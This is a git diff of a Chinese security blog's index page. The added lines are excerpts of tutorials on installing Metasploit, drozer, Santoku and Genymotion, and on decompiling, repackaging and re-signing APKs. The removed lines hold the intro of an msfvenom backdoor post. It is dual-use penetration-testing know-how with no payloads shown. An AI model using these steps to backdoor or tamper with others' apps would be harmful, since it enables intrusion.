@@ -209,6 +209,506 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85Metasploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85Metasploit/" class="post-title-link" itemprop="url">Ubuntu安装Metasploit</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 17:42:30 / 修改时间：17:49:03" itemprop="dateCreated datePublished" datetime="2020-01-14T17:42:30+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux系统</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="1-安装metasploit"><a href="#1-安装metasploit" class="headerlink" title="1.安装metasploit"></a>1.安装metasploit</h3><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+chmod 755 msfinstall
+./msfinstall</code></pre><p><img src="http://static.zybuluo.com/xmy2017/xpt7gv8ybmoswz3i1tsag89v/20.png" alt="20.png-35.5kB"></p>
+<h3 id="2-安装postgresql"><a href="#2-安装postgresql" class="headerlink" title="2.安装postgresql"></a>2.安装postgresql</h3><pre><code>apt-get install postgresql</code></pre><p><img src="http://static.zybuluo.com/xmy2017/a340z7jkrefzxw0rpxxp3dem/21.png" alt="21.png-22.6kB"><br>配置用户名和密码：</p>
+<pre><code>su – postgres
+psql
+\password postgres</code></pre><p><img src="http://static.zybuluo.com/xmy2017/1es139oyf0sm5xfyljo1lfho/22.png" alt="22.png-24kB"></p>
+<h3 id="3-msf连接数据库"><a href="#3-msf连接数据库" class="headerlink" title="3.msf连接数据库"></a>3.msf连接数据库</h3><pre><code>msfconsole
+db_connect postgres:123456@127.0.0.1/msf
+db_status</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85Metasploit/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85JDK%E5%92%8CTomcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85JDK%E5%92%8CTomcat/" class="post-title-link" itemprop="url">Ubuntu安装JDK和Tomcat</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 17:36:36 / 修改时间：17:41:35" itemprop="dateCreated datePublished" datetime="2020-01-14T17:36:36+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux系统</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h3><p>安装环境如下：<br><em>Ubuntu版本：Ubuntu 16.04.3</em><br><em>jdk版本：jdk-8u144-linux-x64</em><br><em>tomcat版本：apache-tomcat-8.5.23</em><br>首先下载jdk和tomcat，下载页面如下：<br>JDK: <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>Tomcat：<a href="https://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">https://tomcat.apache.org/download-80.cgi</a></p>
+<h3 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h3><p>解压jdk压缩包：</p>
+<pre><code>tar xzvf jdk-8u144-linux-x64.tar.gz</code></pre><p>创建安装目录并将解压的jdk文件夹移动到该目录：</p>
+<pre><code>sudo mkdir /usr/lib/jvm
+sudo mv jdk1.8.0_144/ /usr/lib/jvm</code></pre><p>配置/etc/profile文件，在后面添加以下内容：</p>
+<pre><code>export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_144  #修改为自己的安装目录
+export JRE_HOME=${JAVA_HOME}/jre  
+export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib  
+export PATH=${JAVA_HOME}/bin:$PATH</code></pre><p>然后让配置生效：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85JDK%E5%92%8CTomcat/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Santoku%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/Santoku%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/" class="post-title-link" itemprop="url">Santoku安装部署</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 17:31:21 / 修改时间：17:34:10" itemprop="dateCreated datePublished" datetime="2020-01-14T17:31:21+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">移动安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>如果说Web安全爱好者居家旅行必备的利器是Kali Linux的话，那移动安全爱好者必备的利器应该就是Santoku了。Santoku是基于Ubuntu的移动安全分析平台，致力于手机恶意代码分析，内置安装AndroGuard工具包。<br>Santoku的官方下载地址是<a href="https://santoku-linux.com/" target="_blank" rel="noopener">https://santoku-linux.com/</a>，当前版本是0.5。</p>
+<h3 id="安装Santoku"><a href="#安装Santoku" class="headerlink" title="安装Santoku"></a>安装Santoku</h3><p>下面演示如何使用VMware安装Santoku。基本上是和Ubuntu一样的安装方法，创建虚拟机后，启动界面如下所示：<br><img src="http://static.zybuluo.com/xmy2017/r7x6v2vdxvah3piw81de294x/31.png" alt="31.png-413.6kB"><br>选择“live – boot the Live System”进入Live CD模式，这种模式下不需要安装就可以正常使用系统，缺点是无法保存文件。如果需要安装的话，可以在这个界面下选择“install – start the installer directly”，当然也可以在Live CD模式下选择“Install Santoku 14.04”：<br><img src="http://static.zybuluo.com/xmy2017/cps4k75fq0an2l1ei46mpa6u/32.png" alt="32.png-615.8kB"><br>启动安装程序，选择“中文（简体）”：<br><img src="http://static.zybuluo.com/xmy2017/ttgnizxm3m72cq9yqr3a3qu3/33.png" alt="33.png-84.1kB"><br>  选择硬盘分区方式，如果你对Linux分区不熟悉，就选择第一项“清除整个磁盘并安装Santoku”，我通常喜欢自己定义分区：<br><img src="http://static.zybuluo.com/xmy2017/nc1fv4sngm8fhh296inpqc4b/34.png" alt="34.png-115.8kB"><br>创建用户和密码：<br><img src="http://static.zybuluo.com/xmy2017/kwk1ns1j03ey87wouuia39sk/35.png" alt="35.png-77.2kB"><br>之后便进入了安装阶段，喝杯茶坐等安装完成吧：<br><img src="http://static.zybuluo.com/xmy2017/q5n7neyt6kfr0o5ku6w0j3jb/36.png" alt="36.png-602.7kB"><br>安装完成后重启Santoku，启动完成后如下：<br><img src="http://static.zybuluo.com/xmy2017/dec8i42lakpuwqn92l90sdm5/37.png" alt="37.png-574.5kB"></p>
+<h3 id="修改更新源"><a href="#修改更新源" class="headerlink" title="修改更新源"></a>修改更新源</h3><p>我们修改更新源，将它指向aliyun的源，这样可以极大地提高更新速度。打开菜单，选择“Preferences”-“Sofeware &amp; Updates”：<br><img src="http://static.zybuluo.com/xmy2017/v5tomo6ro8v3gw31az14qywa/38.png" alt="38.png-492.8kB"><br>在“Download from”中选择Other，找到“China”下的“mirrors.aliyun.com”:<br><img src="http://static.zybuluo.com/xmy2017/nilmgn2l5ji5w50fcse4mm6d/39.png" alt="39.png-314.1kB"><br>关闭时选择”Reload”更新缓存：<br><img src="http://static.zybuluo.com/xmy2017/4tpix15apxct5zheqf808i8t/40.png" alt="40.png-320.8kB"> </p>
+<h3 id="更改语言为中文"><a href="#更改语言为中文" class="headerlink" title="更改语言为中文"></a>更改语言为中文</h3><p>选择“Preferences”-“Language Support”：<br><img src="http://static.zybuluo.com/xmy2017/cekyj6cidk34itz0ijo534x2/41.png" alt="41.png-493.2kB"><br>选择“Install”：<br><img src="http://static.zybuluo.com/xmy2017/qb79mtvj5kb8y3obcd1ajkdz/42.png" alt="42.png-340.8kB"><br>安装完成后将“汉语”拖动到语言选项的最上方：<br><img src="http://static.zybuluo.com/xmy2017/7qsxlhx9l49s0dfpbxq3wih2/43.png" alt="43.png-373.8kB"><br>重启系统之后就变成中文了：<br><img src="http://static.zybuluo.com/xmy2017/dfintm29aknfbg5131oj7pjo/44.png" alt="44.png-493.2kB"></p>
+<h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>选择“系统工具”-“软件更新器”，或者在终端下使用“sudo apt-get upgrade”指令更新系统：<br><img src="http://static.zybuluo.com/xmy2017/upijulkg4lb8970fk3tka3q7/45.png" alt="45.png-511.6kB"><br><img src="http://static.zybuluo.com/xmy2017/295t2x33wtv1u6n1qpovtf3k/46.png" alt="46.png-357.7kB"></p>
+<h3 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h3>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/Santoku%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">drozer安装和使用</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 16:57:21 / 修改时间：17:03:31" itemprop="dateCreated datePublished" datetime="2020-01-14T16:57:21+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">移动安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Drozer是一款非常不错的Android APP安全评估工具，下面介绍如何安装和使用它。</p>
+<h3 id="Drozer下载"><a href="#Drozer下载" class="headerlink" title="Drozer下载"></a>Drozer下载</h3><p>Drozer的下载地址是<a href="https://labs.mwrinfosecurity.com/tools/drozer/" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/tools/drozer/</a>，需要下载PC端和手机agent.apk，我下载的是Windows版本：<br><img src="http://static.zybuluo.com/xmy2017/u358atlwiulm2wu6h2tqhjjf/1.png" alt="1.png-114.3kB"></p>
+<h3 id="Drozer安装"><a href="#Drozer安装" class="headerlink" title="Drozer安装"></a>Drozer安装</h3><p>在PC上安装Drozer：<br><img src="http://static.zybuluo.com/xmy2017/z3cbsnx1x7n5qxaho8qlx8ke/2.png" alt="2.png-42.6kB"><br>   在手机或者Android模拟器上安装Drozer，我这里在夜神Android模拟器上安装：<br><img src="http://static.zybuluo.com/xmy2017/lhx5kyccsu9iragsud5laqj6/3.png" alt="3.png-921.7kB"></p>
+<h3 id="Drozer连接"><a href="#Drozer连接" class="headerlink" title="Drozer连接"></a>Drozer连接</h3><p>在Windows命令提示符窗口中输入“Drozer”查看使用方法：<br><img src="http://static.zybuluo.com/xmy2017/i2hrtnyc6qiy2ou6q9eep3o9/4.png" alt="4.png-24.2kB"></p>
+<p>console            运行Drozer命令行窗口<br>module　　　管理Drozer组件<br>server    　　　运行Drozer服务器<br>ssl　　　　　　管理Drozer SSL密钥<br>exploit            　生成可以在Drozer中使用的攻击代码<br>agent            　生成用户定义的Drozer agent<br>payload            生成可以在Drozer中使用的Payload</p>
+<p>在模拟器中运行Drozer：<br><img src="http://static.zybuluo.com/xmy2017/rsz8f55iktf34ar9gi2w9acz/5.png" alt="5.png-47.3kB"><br>可以看到端口为31415，单击“Embedded Server”，可以看到运行状态：<br><img src="http://static.zybuluo.com/xmy2017/b33hwxccnd8yda1ofcr3xcsy/6.png" alt="6.png-91.1kB"><br>首先PC端要连接Android模拟器：<br> <img src="http://static.zybuluo.com/xmy2017/69l70t5rlpmacjdpuddk04mu/7.png" alt="7.png-5.4kB"><br>62001是夜神模拟器的端口，其他的模拟器请替换成相应的端口。<br>接着连接Drozer端口：</p>
+<p>adb forward tcp:31415 tcp:31415</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/deepin%E5%AE%89%E8%A3%85Android%E6%A8%A1%E6%8B%9F%E5%99%A8Genymotion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/deepin%E5%AE%89%E8%A3%85Android%E6%A8%A1%E6%8B%9F%E5%99%A8Genymotion/" class="post-title-link" itemprop="url">deepin安装Android模拟器Genymotion</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 16:51:03 / 修改时间：16:56:41" itemprop="dateCreated datePublished" datetime="2020-01-14T16:51:03+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">移动安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Genymotion是一个跨平台的Android模拟器，支持Windows、Mac和Linux，基于x86架构，可以将Eclipse和Androidstudio完美整合到开发环境中。<br>下面介绍如何在deepin中安装和使用Genymotion。</p>
+<h3 id="Genymotion下载"><a href="#Genymotion下载" class="headerlink" title="Genymotion下载"></a>Genymotion下载</h3><p>Genymotion的中文官网是<a href="http://www.genymotion.net/" target="_blank" rel="noopener">http://www.genymotion.net/</a>，这个网站除了介绍Genymotion的特性之外并没有什么用，我们首先要注册账号：<br><img src="http://static.zybuluo.com/xmy2017/vq859rh2x5n3n699swlvccvb/1.png" alt="1.png-161.3kB"><br>正式的官网是<a href="https://www.genymotion.com/" target="_blank" rel="noopener">https://www.genymotion.com/</a>：<br><img src="http://static.zybuluo.com/xmy2017/1rdk3hga7scgl8hr043ce28b/2.png" alt="2.png-66.3kB">   注册成功后登录官网，下载的页面是：<a href="https://www.genymotion.com/download/" target="_blank" rel="noopener">https://www.genymotion.com/download/</a><br> <img src="http://static.zybuluo.com/xmy2017/t2dbrr05xvsnv126u2fcfgy4/3.png" alt="3.png-88.7kB"><br>除了在官网下载，还可以在deepin的深度商店上下载安装，但是在官网注册的步骤不能省略，后面配置需要登录。打开深度商店，找到“编程开发”，如下：<br><img src="http://static.zybuluo.com/xmy2017/b8294uqpt03j5qjm848e1luk/4.png" alt="4.png-118.7kB"></p>
+<h3 id="Genymotion安装"><a href="#Genymotion安装" class="headerlink" title="Genymotion安装"></a>Genymotion安装</h3><p>安装如下：</p>
+<p>chmod 755 genymotion-2.11.0-linux_x64.bin<br>sudo mv genymotion-2.11.0-linux_x64.bin /opt<br>cd /opt<br>sudo ./genymotion-2.11.0-linux_x64.bin</p>
+<p><img src="http://static.zybuluo.com/xmy2017/x3c0zmpgy1faj0kxpcedpgj7/5.png" alt="5.png-85.2kB"></p>
+<h3 id="配置Genymotion"><a href="#配置Genymotion" class="headerlink" title="配置Genymotion"></a>配置Genymotion</h3><p>启动Genymotin如下：</p>
+<p>cd genymobile/genymotion/<br>./genymotion</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/deepin%E5%AE%89%E8%A3%85Android%E6%A8%A1%E6%8B%9F%E5%99%A8Genymotion/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/apk%E5%8F%8D%E7%BC%96%E8%AF%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/apk%E5%8F%8D%E7%BC%96%E8%AF%91/" class="post-title-link" itemprop="url">apk反编译</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 16:44:35 / 修改时间：16:48:05" itemprop="dateCreated datePublished" datetime="2020-01-14T16:44:35+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">移动安全</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="dex2jar获得jar代码文件"><a href="#dex2jar获得jar代码文件" class="headerlink" title="dex2jar获得jar代码文件"></a>dex2jar获得jar代码文件</h3><p><font color="red">dex2jar.bat apk文件</font><br> <img src="http://static.zybuluo.com/xmy2017/o1gup1xjq01jfbr417rfsa11/21.png" alt="21.png-14.8kB"><br>也可以直接将apk文件拖放到dex2jar.bat上。<br>或者使用第二种办法，将apk当成zip解压，得到如下文件：<br><img src="http://static.zybuluo.com/xmy2017/yk3agefhovuwpgsz3tlggxi4/22.png" alt="22.png-102.3kB"><br>用dex2jar.bat将classes.dex进行转换：<br><font color="red">dex2jar.bat classes.dex</font><br><img src="http://static.zybuluo.com/xmy2017/d547u96kpytwg15oqgxxk7ik/23.png" alt="23.png-15.5kB"></p>
+<h3 id="jd-gui读取jar文件"><a href="#jd-gui读取jar文件" class="headerlink" title="jd-gui读取jar文件"></a>jd-gui读取jar文件</h3><p>使用jd-gui来读取jar文件：<br><img src="http://static.zybuluo.com/xmy2017/vg9yu48p2stbuld8o64xxb87/24.png" alt="24.png-54kB"><br>选择File-Save All Sources保存成zip压缩包，便可将其还原成java文件。</p>
+<h3 id="apktool调试apk文件"><a href="#apktool调试apk文件" class="headerlink" title="apktool调试apk文件"></a>apktool调试apk文件</h3><p>解包apk文件：<br><font color="red">java –jar apktool.jar d –f apk 源文件路径 –o 目标文件路径</font><br><img src="http://static.zybuluo.com/xmy2017/685xgu9q9wop6yxvchy61csn/25.png" alt="25.png-32.2kB"><br>重新打包apk文件：<br><font color="red">java –jar apktool.jar b –f 源目录 –o 目标apk文件路径</font><br><img src="http://static.zybuluo.com/xmy2017/tsv18h52jtnmc19huu0gry5w/26.png" alt="26.png-15.5kB"><br>解包后的apk可以直接查看smali文件：<br> <img src="http://static.zybuluo.com/xmy2017/x4y7m3lwypsgzzg7v16kxsna/27.png" alt="27.png-65.6kB"><br>也可以直接读取AndroidManifest.xml的内容：<br><img src="http://static.zybuluo.com/xmy2017/4ahpofcl8564wsiqttrax8tn/28.png" alt="28.png-47.4kB"></p>
+<h3 id="keytool生成证书文件"><a href="#keytool生成证书文件" class="headerlink" title="keytool生成证书文件"></a>keytool生成证书文件</h3><p>keytool生成证书文件：<br><font color="red">keytool -genkey -v -keystore my_key.Keystore -alias android_key -keyalg RSA -keysize 2048 -validity 9999</font><br><img src="http://static.zybuluo.com/xmy2017/hxmpkqeu4jviu27ad84s7ehh/1.png" alt="1.png-277.7kB"></p>
+<h3 id="jarsigner对apk文件签名"><a href="#jarsigner对apk文件签名" class="headerlink" title="jarsigner对apk文件签名"></a>jarsigner对apk文件签名</h3><p><font color="red">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my_key.Keystore test.apk android_key</font><br><img src="http://static.zybuluo.com/xmy2017/2llhfls0uqeb8ds0rzjkaxpu/2.png" alt="2.png-139kB"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/apk%E5%8F%8D%E7%BC%96%E8%AF%91/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/heredoc%E5%92%8Cnowdoc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -583,534 +1083,6 @@ options:
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/14/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">msfvenom后门生成工具</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-01-14 16:07:18 / 修改时间：16:21:16" itemprop="dateCreated datePublished" datetime="2020-01-14T16:07:18+08:00">2020-01-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
-                    <span itemprop="name">后门工具</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>渗透神器Metasploit的功能之一就是生成与利用攻击载荷（Payload），生成这些载荷的工具是msfvenom。下面我们来玩一个这个一听就知道十分好玩的工具。</p>
-<h3 id="msfvenom的参数"><a href="#msfvenom的参数" class="headerlink" title="msfvenom的参数"></a>msfvenom的参数</h3><p>我们先来看一下msfvenom的命令行选项：</p>
